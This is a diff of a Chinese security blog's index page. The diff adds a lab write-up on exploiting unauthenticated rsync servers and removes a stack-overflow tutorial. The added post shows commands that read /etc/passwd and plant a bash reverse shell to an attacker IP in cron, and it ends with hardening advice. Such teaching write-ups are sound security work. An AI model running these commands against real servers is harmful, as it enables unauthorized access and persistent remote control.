@@ -59,6 +59,109 @@
 
   
     
+    <h3 class="article-title"><a href="/2019/04/20/rsync-未授权访问漏洞复现/"><span>rsync 未授权访问漏洞复现</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/04/20/rsync-未授权访问漏洞复现/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-04-20T08:55:25.000Z">
+          2019-04-20
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <blockquote>
+<p>你也一定是某个人翘首以盼的惊喜！</p>
+</blockquote>
+<p>最近在渗透环境中有遇到<code>Rsync</code>端口开放的，所以刚好也来复现下这个漏洞，亦当记录笔记：</p>
+<p><strong><em>0x00 漏洞介绍</em></strong></p>
+<p><code>Rsync</code>是<code>Linux</code>下一款数据备份工具，支持通过<code>rsync</code>协议、<code>ssh</code>协议进行远程文件传输。常被用于在内网进行源代码的分发及同步更新，因此使用人群多为开发人员。其中<code>rsync</code>协议默认监听<code>873</code>端口，而一般开发人员安全意识薄弱的情况下，如果目标开启了<code>rsync</code>服务，并且没有配置<code>ACL</code>或访问密码，我们将可以读写目标服务器文件。</p>
+<p><strong><em>0x01 环境搭建</em></strong></p>
+<p>环境搭建我依然用<code>vulhub</code>，简直太好了！</p>
+<p>同样我们进入到<code>/vulhub-master/rsync/common</code>目录下，编译及运行<code>rsync</code>服务器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>但在编译的时候有报错</p>
+<p><img src="/2019/04/20/rsync-未授权访问漏洞复现/3.PNG" alt=""></p>
+<p>解决：在<code>Dockerfile</code>文件中<code>add</code> 这一行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN printf &quot;deb http://archive.debian.org/debian/ jessie main\ndeb-src http://archive.debian.org/debian/ jessie main\ndeb http://security.debian.org jessie/updates main\ndeb-src http://security.debian.org jessie/updates main&quot; &gt; /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/04/20/rsync-未授权访问漏洞复现/4.PNG" alt=""></p>
+<p>接着我们继续来看看<code>rsync</code>的常用命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">列举整个同步目录或指定目录：</span><br><span class="line">rsync ip::</span><br><span class="line">rsync ip::xxx/</span><br><span class="line">下载文件或目录到本地：</span><br><span class="line">rsync -avz ip::xxx/xx.php /root</span><br><span class="line">rsync -avz ip::xxx/ /var/tmp</span><br><span class="line">上传文件到服务器：</span><br><span class="line">rsync -avz webshell.php ip::web/</span><br></pre></td></tr></table></figure>
+<p><strong><em>0x02 漏洞复现</em></strong></p>
+<p><code>nmap</code>先扫一波：</p>
+<p><img src="/2019/04/20/rsync-未授权访问漏洞复现/6.PNG" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rsync rsync://your-ip:873/</span><br><span class="line">rsync rsync://your-ip:873/src 来查看模块名列表</span><br><span class="line">我们再列出src模块下的文件</span><br><span class="line">rsync rsync://your-ip:873/src/</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/04/20/rsync-未授权访问漏洞复现/1.PNG" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们可以下载任意文件：</span><br><span class="line">rsync -av rsync://your-ip:873/src/etc/passwd ./</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/04/20/rsync-未授权访问漏洞复现/2.PNG" alt=""></p>
+<p><strong>提权：</strong></p>
+<p>写入<code>shell</code>并赋权：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash </span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.91.128/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">chmod +x shell</span><br></pre></td></tr></table></figure>
+<p>将<code>shell</code>上传至<code>/etc/cron.hourly</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rsync -av shell rsync://192.168.91.130/src/etc/cron.hourly</span><br><span class="line">rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/04/20/rsync-未授权访问漏洞复现/7.PNG" alt=""></p>
+<p>本地监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvv -lp 4444</span><br></pre></td></tr></table></figure>
+<p><strong><em>0x03 防范与总结</em></strong></p>
+<p>这种未授权访问漏洞，一般都是在配置的时候，未能实现安全配置或权限认证而导致的，所以我们先来看看<code>rsync</code>的文件配置与认证方式。<code>rsync</code>的默认配置文件为<code>/etc/rsyncd.conf</code>，常驻模式启动命令的<code>rsync -daemon</code>，启动成功后默认监听于TCP端口873，可通过<code>rsync</code>的守护及SSH两种方式进行认证。</p>
+<p>我们来看下含有漏洞的<code>rsync</code>的文件的配置</p>
+<p><img src="/2019/04/20/rsync-未授权访问漏洞复现/5.PNG" alt=""></p>
+<p><code>rsync</code><strong>默认</strong>允许匿名访问，也可在其配置文件中为同步目录添加用户认证相关项，包括认证文件及授权账号，若未包含授权账号行（<code>auth users</code>），则为匿名访问。所以问题就出在这。</p>
+<p>我们来看下配置文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">配置文件位置：/etc/rsync.conf，常见配置项</span><br><span class="line"></span><br><span class="line">motd file -&gt; motd文件位置</span><br><span class="line">log file -&gt; 日志文件位置</span><br><span class="line">path -&gt; 默认路径位置</span><br><span class="line">use chroot -&gt; 是否限定在该目录下，默认为true，当有软连接时，需要改为fasle,如果为true就限定为模块默认目录</span><br><span class="line">read only -&gt; 只读配置（yes or no）</span><br><span class="line">list=true -&gt; 是否可以列出模块名</span><br><span class="line">uid = root -&gt; 传输使用的用户名</span><br><span class="line">gid = root -&gt; 传输使用的用户组</span><br><span class="line">auth users -&gt; 认证用户名</span><br><span class="line">secrets file=/etc/rsyncd.passwd -&gt; 指定密码文件，如果设定验证用户，这一项必须设置，设定密码权限为400,密码文件/etc/rsyncd.passwd的内容格式为：username:password</span><br><span class="line">hosts allow=192.168.0.101  -&gt; 设置可以允许访问的主机，可以是网段，多个Ip地址用空格隔开</span><br><span class="line">hosts deny 禁止的主机，host的两项可以使用*表任意。</span><br></pre></td></tr></table></figure>
+<p>漏洞修复：</p>
+<ul>
+<li>正确配置认证用户名或者密码</li>
+<li>使用足够但最小权限</li>
+<li><code>host allow/deny</code> 来控制接入源IP</li>
+<li>可以配置只读</li>
+<li>非必要应该仅限制配置路径下可访问</li>
+</ul>
+<p><strong><em>0x04 参考</em></strong></p>
+<p>【1】<a href="https://github.com/vulhub/vulhub/tree/master/rsync/common" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/rsync/common</a></p>
+<p>【2】<a href="https://superuser.com/questions/1423486/issue-with-fetching-http-deb-debian-org-debian-dists-jessie-updates-inrelease/1424377%EF%BC%89" target="_blank" rel="noopener">https://superuser.com/questions/1423486/issue-with-fetching-http-deb-debian-org-debian-dists-jessie-updates-inrelease/1424377%EF%BC%89</a></p>
+<p>【3】<a href="https://blog.csdn.net/qq_36374896/article/details/84143428" target="_blank" rel="noopener">https://blog.csdn.net/qq_36374896/article/details/84143428</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/渗透测试/">渗透测试</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
     <h3 class="article-title"><a href="/2019/03/31/Flask（Jinja2）-服务端模板注入漏洞/"><span>Flask（Jinja2） 服务端模板注入漏洞</span></a></h3>
     
   
@@ -826,95 +929,6 @@
     <span class="post-tags">
       <i class="icon-tags"></i>
         <a href="/tags/漏洞挖掘/">漏洞挖掘</a>
-    </span>
-    
-
-    </div>
-
-    
-  </div>
-</article>
-
-
-
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2018/10/28/栈溢出学习笔记/"><span>栈溢出学习笔记</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2018/10/28/栈溢出学习笔记/" rel="bookmark">
-        <time class="entry-date published" datetime="2018-10-28T10:19:40.000Z">
-          2018-10-28
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <p>在上一篇博客中对栈溢出的相关原理进行了浅析，接下来我找了个实例来进一步来加强理解，首先我们来看代码</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vuln.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="keyword">char</span> buf[<span class="number">80</span>];</span><br><span class="line"> <span class="keyword">int</span> r;</span><br><span class="line"> r = read(<span class="number">0</span>, buf, <span class="number">400</span>);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"\nRead %d bytes. buf is %s\n"</span>, r, buf);</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">"No shell for you :("</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Try to exec /bin/sh"</span>);</span><br><span class="line"> vuln();</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>操作系统提供了许多安全机制来试图降低或阻止缓冲区溢出攻击带来的安全风险，包括<code>DEP、ASLR</code>等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了<code>DEP</code>（<code>Linux</code>下对应<code>NX</code>）、<code>ASLR</code>（<code>Linux</code>下对应<code>PIE</code>）等机制，例如存在<code>DEP</code>（<code>NX</code>）的话就不能直接执行栈上的数据，存在<code>ASLR</code>的话各个系统调用的地址就是随机化的。所以在编译之前，首先要来关闭掉<code>linux</code>系统栈保护机制。</p>
-<p>学习下相关的保护机制，<code>checksec</code>工具可以来检查各个保护机制是否打开</p>
-<p><img src="/2018/10/28/栈溢出学习笔记/1.PNG" alt=""></p>
-<p>依次来看看上图中的各个保护机制，这个具体可参考（<a href="https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">上善若水的博客</a>），下面应用一部分当学习笔记记录吧：</p>
-<ul>
-<li><p><code>CANNARY</code>(栈保护)：上图中表示栈保护功能开启，栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让自己已经设计好的<code>shellcode</code>得到执行。而当启用栈保护后，函数开始执行的时候会先往栈里插入<code>cookie</code>信息，当函数真正返回的时候会验证<code>cookie</code>信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将<code>cookie</code>信息给覆盖掉，导致栈保护检查失败而阻止<code>shellcode</code>的执行。在<code>Linux</code>中我们将<code>cookie</code>信息称为<code>CANARY</code>。</p>
-</li>
-<li><p><code>FORTIFY</code>:<code>FORTIFY</code>其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如<code>memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets</code>以及宽字符的变体。</p>
-</li>
-<li><p><code>NX(DEP)</code>:<code>NX</code>（<code>No-eXecute</code>）即为不可执行的意思，基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入<code>shellcode</code>时，程序会尝试在数据页面上执行指令，此时<code>CPU</code>就会抛出异常，而不是去执行恶意指令。</p>
-<p>工作原理如图：</p>
-<p><img src="/2018/10/28/栈溢出学习笔记/2.PNG" alt=""></p>
-</li>
-<li><p><code>PIE(ASLR)</code>:一般情况下<code>NX</code>（<code>Windows</code>平台上称其为<code>DEP</code>）和地址空间分布随机化（<code>ASLR</code>）会同时工作。内存地址随机化机制（<code>address space layout randomization</code>)，有以下三种情况</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈（heap）的随机化。</span><br></pre></td></tr></table></figure>
-<p>可以防范基于<code>Ret2libc</code>方式的针对<code>DEP</code>的攻击。<code>ASLR</code>和<code>DEP</code>配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>
-</li>
-<li><p><code>RELRO</code>:在<code>Linux</code>系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处.</p>
-<p><code>GCC, GNU linker</code>以及<code>Glibc-dynamic linker</code>一起配合实现了一种叫做<code>relro</code>的技术: <code>read only relocation</code>。大概实现就是由linker指定binary的一块经过<code>dynamic linker</code>处理过 <code>relocation</code>之后的区域为只读.</p>
-<p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对<code>GOT（Global Offset Table）</code>攻击。<code>RELRO</code>为” <code>Partial RELRO</code>”，说明我们对<code>GOT</code>表具有写权限。</p>
-</li>
-</ul>
-<p>在利用程序在编译之前我们首先要关闭系统的<code>ASLR</code> 方法，<code>checksec</code>如下 所以：</p>
-<p><img src="/2018/10/28/栈溢出学习笔记/3.PNG" alt=""></p>
-<p>接下来，我们要如何利用该程序的漏洞呢，所以要做的是覆盖返回地址，即覆盖掉栈中的返回地址，从而让指令寄存器去执行我之前设定好的<code>shellcode</code>,在之前，我们先看下该段代码的反汇编代码</p>
-<p><img src="/2018/10/28/栈溢出学习笔记/4.PNG" alt=""></p>
-<p>该段程序当<code>read()</code>将<code>400</code>字节复制到一个<code>80</code>字节的<code>buffer</code>时，显然存在缓冲区溢出，下面我们构造我们的<code>exp</code>,来看看是否能够覆盖<code>RIP</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">buf = <span class="string">""</span></span><br><span class="line">buf += <span class="string">"A"</span>*<span class="number">400</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"in.txt"</span>, <span class="string">"w"</span>)</span><br><span class="line">f.write(buf)</span><br></pre></td></tr></table></figure>
-<p>我们将利用这个<code>exp</code>来创建一个含有400个”A” 字符的”<code>in.txt</code>“文件，并且将典例加载进gdb并将in.txt的内容重定向到典例中</p>
-<p><img src="/2018/10/28/栈溢出学习笔记/6.PNG" alt=""></p>
-<p>程序显然崩掉了，但是却没有覆盖到<code>RIP</code>,因为我们已覆盖的<code>RIP</code>带有一个无效地址，事实上我们没控制到<code>RIP</code>,为了控制<code>RIP</code>，我们需要用<code>0x0000414141414141</code>覆盖(代替)它，因此真正的目标是找到覆盖了<code>RIP</code>的偏移（带有一个非标准地址）。我们可以使用一种<code>cyclic</code>模板找到这个偏移，并且再次运行检查<code>RSP</code>的内容，最后便可以看到偏移</p>
-<p><img src="/2018/10/28/栈溢出学习笔记/7.PNG" alt=""></p>
-<p>因此,<code>RIP</code>在偏移<code>104</code>上.让我们重新构造我们的<code>exp</code>并看看我们这次是否可以覆盖<code>RIP</code>:</p>
-<p><img src="/2018/10/28/栈溢出学习笔记/8.PNG" alt=""></p>
-<p>很棒,我们已经彻底控制了RIP。最后，我们可以继续构造我们的<code>shellcode</code>。</p>
-
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/逆向/">逆向</a>
     </span>
     
 
